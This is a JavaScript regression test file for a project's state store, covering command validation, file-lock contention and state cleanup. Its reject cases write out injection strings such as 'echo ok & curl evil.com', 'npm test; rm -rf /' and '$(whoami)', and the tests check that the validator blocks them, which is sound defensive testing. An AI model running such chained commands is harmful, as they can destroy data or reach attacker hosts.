/**
 * Regression tests for verify/state hardening review findings:
 * - validateVerifyCommand bare-& / CR / redirects
 * - setProjectTeamMode lock contention throws (no silent ACTIVATED)
 * - deleteState returns false when critical artifacts remain
 * - zod-facing empty/whitespace goals covered via store createState + schema notes
 */

import {join} from 'path';
import {
	mkdirSync,
	writeFileSync,
	existsSync,
	rmSync,
	readFileSync,
	unlinkSync,
} from 'fs';
import {pathToFileURL} from 'url';

const storePath = join(process.cwd(), 'dist', 'state', 'store.js');
const stateDir = join(process.cwd(), '.snow', 'oms-state');

let pass = 0;
let fail = 0;

function assert(name, condition, detail = '') {
	if (condition) {
		console.log(`✅ PASS: ${name}`);
		pass++;
	} else {
		console.log(`❌ FAIL: ${name} ${detail}`);
		fail++;
	}
}

async function main() {
	const store = await import(pathToFileURL(storePath).href);

	// ── validateVerifyCommand ──
	function expectReject(label, cmd) {
		let threw = false;
		try {
			store.validateVerifyCommand(cmd);
		} catch {
			threw = true;
		}
		assert(label, threw, `expected reject for: ${JSON.stringify(cmd)}`);
	}
	function expectAllow(label, cmd) {
		let threw = false;
		try {
			store.validateVerifyCommand(cmd);
		} catch (e) {
			threw = true;
			assert(label, false, `unexpected reject: ${e.message}`);
			return;
		}
		assert(label, !threw);
	}

	expectAllow('allow npm test', 'npm test');
	expectAllow('allow && chain', 'npm run build && npm test');
	expectAllow('allow pipe', 'npm test | cat');

	expectReject('reject || silent-green', 'npm test || true');
	expectReject('reject || no spaces', 'a||b');
	expectReject('reject bare & with spaces', 'echo ok & curl evil.com');
	expectReject('reject bare & no spaces', 'cmd&evil');
	expectReject('reject trailing & after &&', 'a && b & c');
	expectReject('reject semicolon', 'npm test; rm -rf /');
	expectReject('reject dollar', 'npm test $(whoami)');
	expectReject('reject backtick', 'npm test `id`');
	expectReject('reject LF', 'npm test\nevil');
	expectReject('reject CR', 'npm test\revil');
	expectReject('reject redirect >', 'npm test > out.txt');
	expectReject('reject redirect <', 'npm test < in.txt');

	// ── setProjectTeamMode lock contention throws ──
	const snowDir = join(process.cwd(), '.snow');
	const settingsPath = join(snowDir, 'settings.json');
	const lockPath = settingsPath + '.lock';
	mkdirSync(snowDir, {recursive: true});
	// Fresh settings without teamMode
	writeFileSync(settingsPath, JSON.stringify({other: true}, null, 2));
	// Hold lock so withFileLock cannot acquire
	writeFileSync(lockPath, '');
	// Touch mtime to now so it is not stale-reaped (120s)
	let threwContention = false;
	try {
		store.setProjectTeamMode(true);
	} catch (e) {
		threwContention = /lock contention/i.test(e.message);
	}
	assert(
		'setProjectTeamMode throws on lock contention',
		threwContention,
		'expected lock contention Error',
	);
	// Cleanup lock and verify success path
	try {
		unlinkSync(lockPath);
	} catch {}
	const changed = store.setProjectTeamMode(true);
	assert('setProjectTeamMode writes when unlocked', changed === true);
	const settings = JSON.parse(readFileSync(settingsPath, 'utf-8'));
	assert('teamMode true after write', settings.teamMode === true);
	assert('preserves other settings keys', settings.other === true);
	// Idempotent false when already true
	const again = store.setProjectTeamMode(true);
	assert('idempotent already-enabled returns false', again === false);

	// ── deleteState residual reporting ──
	mkdirSync(stateDir, {recursive: true});
	writeFileSync(join(stateDir, 'state.json'), JSON.stringify({sessionId: 't'}));
	writeFileSync(join(stateDir, 'verify.cmd'), 'npm test');
	const cleaned = store.deleteState();
	assert('deleteState cleans critical artifacts', cleaned === true);
	assert('state.json gone', !existsSync(join(stateDir, 'state.json')));
	assert('verify.cmd gone', !existsSync(join(stateDir, 'verify.cmd')));

	// Clean lock leftovers
	try {
		unlinkSync(lockPath);
	} catch {}

	console.log(`\n${pass} passed, ${fail} failed`);
	process.exit(fail > 0 ? 1 : 0);
}

main().catch(err => {
	console.error(err);
	process.exit(1);
});
